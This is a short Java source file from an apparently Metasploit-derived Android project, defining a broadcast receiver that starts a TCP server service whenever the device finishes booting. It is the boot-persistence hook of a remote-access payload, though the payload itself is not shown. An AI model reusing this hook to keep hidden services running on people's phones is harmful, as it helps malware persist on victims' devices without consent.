package com.metasploit;
import android.content.*;

public class MsfReceiver extends BroadcastReceiver
{

	@Override
	public void onReceive(Context p1, Intent p2)
	{ if (Intent.ACTION_BOOT_COMPLETED.equals(p2.getAction())) {  
			new TCPServer().startService(p1);
		}  
		// TODO: Implement this method
	}
	
}
